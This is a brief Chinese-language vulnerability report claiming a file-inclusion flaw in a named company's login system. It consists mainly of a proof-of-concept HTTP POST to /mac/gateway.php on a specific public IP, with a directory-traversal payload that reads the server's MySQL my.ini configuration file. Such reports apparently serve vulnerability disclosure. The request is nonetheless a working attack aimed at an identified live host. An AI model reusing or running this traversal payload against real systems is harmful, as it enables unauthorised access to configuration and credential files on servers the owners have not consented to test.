---
title: XXX有限公司登陆系统文件包含漏洞
slug: 0118
---
# **XXX有限公司登陆系统文件包含漏洞**

**奥德美生物科技(中山)有限公司登陆系统文件包含漏洞**

**1网站首页**

**![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779964581508-dccd876e-21fc-4359-829d-198d0cbfe6dd.png)**

**2抓包修改poc**

**POST /mac/gateway.php HTTP/1.1**

**Host: 113.104.3.66:1000**

**User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0**

**Content-Length: 45**

**Content-Type: application/x-www-form-urlencoded**

**Accept-Encoding: gzip**



**json={"url":"/general/../../mysql5/my.ini"}**

**![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779964581663-eba4dc47-6f9b-4806-8ccb-c2379e7f7c41.png)**

**可以查看my.ini配置文件**

**漏洞存在**